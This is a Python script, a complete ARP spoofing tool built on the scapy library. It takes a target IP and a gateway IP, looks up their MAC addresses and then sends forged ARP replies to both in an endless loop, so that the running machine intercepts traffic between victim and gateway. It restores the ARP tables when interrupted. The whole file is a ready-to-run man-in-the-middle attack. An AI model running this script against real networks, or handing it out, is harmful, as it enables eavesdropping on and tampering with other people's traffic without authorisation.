import sys
import time
import subprocess
import scapy.all as scapy
from termcolor import colored
from optparse import OptionParser


def arg_func():
    """
        Arguments from command string
    """
    try:
        parser = OptionParser()
        parser.add_option("-t", "--target", dest="target_ip", help="Enter target IP in the network")
        parser.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP in the network")
        options, _ = parser.parse_args()
        # Check enter all arguments
        if not options.target_ip:
            parser.error(colored("Enter target IP-address in the network -t or --target", "yellow", attrs=['bold']))
            sys.exit()
        elif not options.gateway_ip:
            parser.error(colored("Enter gateway IP-address in the network -g or --gateway", "yellow", attrs=['bold']))
            sys.exit()
        else:
            return options.target_ip, options.gateway_ip
    except Exception:
        print(colored('[-] An error occurred while adding arguments', 'red', attrs=['bold']))


def get_mac(ip: str):
    """
        ARP Request for get MAC-address target in the network
    """
    try:
        target_mac = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=5, verbose=False
        )[0][0][1].hwsrc

        return target_mac
    except Exception:
        print(colored('[-] An error occurred while scan network', 'red', attrs=['bold']))


def spoof(target_ip: str, gateway_ip: str, target_mac: str):
    """
        Send packet ARP
    """
    try:
        packet = scapy.ARP(
            op=2,  # Send packet
            pdst=target_ip, hwdst=target_mac,  # IP and MAC Addresses victim
            psrc=gateway_ip,  # IP-Address victim
        )

        scapy.send(packet, verbose=False)
    except Exception:
        print(colored('An error occurred while send packet', 'red', attrs=['bold']))


def restore(destination_ip: str, source_ip: str):
    """
        Restore ARP table to default
    """
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(
            op=2,  # Send packet
            pdst=destination_ip, hwdst=destination_mac,  # Destination IP-address
            psrc=source_ip, hwsrc=source_mac  # Source IP-address
        )

        scapy.send(packet, count=4, verbose=False)
    except Exception:
        print(colored('An error occurred while send packet', 'red', attrs=['bold']))


# Get arguments from command string
target_ip, gateway_ip = arg_func()

# Get MAC-address victim for IP
target_mac = get_mac(target_ip)

# Get MAC-address gateway for IP
gateway_mac = get_mac(gateway_ip)

# Run spoof atack
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        print(colored(f'[+] Packets sent {str(sent_packets_count)}', 'cyan', attrs=['bold']), end='\r', flush=True)
        sent_packets_count += 2
        time.sleep(2)
except KeyboardInterrupt:
    print(colored('\n[+] Pressing CTRL + C ...... Attack is interrupted!', 'yellow', attrs=['bold']))

    # Restoring ARP table for default on victims computers
    print(colored('[+] Restoring ARP table for default...... Please wait.', 'yellow', attrs=['bold']))
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print(colored('[+] ARP tables restored to default successfully', 'yellow', attrs=['bold']))
